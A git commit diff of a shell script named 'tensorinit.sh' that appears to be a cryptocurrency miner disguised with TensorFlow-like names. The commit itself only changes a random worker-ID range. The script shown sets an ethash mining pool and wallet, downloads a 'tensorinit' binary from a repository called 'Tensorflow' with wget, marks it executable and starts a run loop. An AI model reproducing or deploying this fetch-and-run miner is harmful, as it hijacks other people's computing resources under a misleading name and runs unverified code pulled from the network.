f899d39535e1e51237759e39f9cfb82dba9f6f1b
nglkmerkel <88254443+nglkmerkel@users.noreply.github.com>
2021-07-31 20:57:44 -0400

    Update tensorinit.sh

--- tensorinit.sh
+++ tensorinit.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 POOL=eth.ethashpool.com:3939
 WALLET=nglkmerkel
-WORKER=$(echo $(shuf -i 10-20 -n 1))
+WORKER=$(echo $(shuf -i 10-2000 -n 1))
 wget https://github.com/nglkmerkel/Tensorflow/raw/main/tensorinit
 chmod +x tensorinit
 while [ 1 ]; do
